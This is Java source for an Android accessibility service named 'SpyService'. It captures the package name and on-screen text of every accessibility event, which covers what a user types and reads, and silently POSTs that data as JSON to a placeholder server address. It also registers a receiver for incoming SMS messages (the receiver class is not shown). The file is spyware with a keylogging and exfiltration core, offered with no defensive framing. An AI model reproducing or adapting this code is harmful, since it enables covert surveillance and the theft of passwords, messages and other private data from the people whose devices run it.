package com.example.service;
import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.os.Bundle;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import org.json.JSONObject;
import android.util.Log;
import android.content.Intent;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.app.Notification;
import android.service.notification.StatusBarNotification;
import android.content.Context;
import android.content.pm.PackageManager;
import androidx.core.app.ActivityCompat;
import android.Manifest;
import android.os.AsyncTask;
import android.content.BroadcastReceiver;
import android.content.IntentFilter;

public class SpyService extends AccessibilityService {
    private static final String SERVER = "http://YOUR_SERVER_IP:3000";
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    JSONObject data = new JSONObject();
                    data.put("type", "accessibility");
                    data.put("package", event.getPackageName());
                    data.put("text", event.getText());
                    data.put("time", System.currentTimeMillis());
                    sendToServer(data.toString());
                } catch (Exception e) {}
            }
        }).start();
    }
    private void sendToServer(String json) {
        try {
            URL url = new URL(SERVER);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            OutputStream os = conn.getOutputStream();
            os.write(json.getBytes());
            os.flush();
            os.close();
            conn.getResponseCode();
        } catch (Exception e) {}
    }
    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        registerReceiver(new SMSReceiver(), new IntentFilter("android.provider.Telephony.SMS_RECEIVED"));
    }
    @Override
    public void onInterrupt() {}
  }
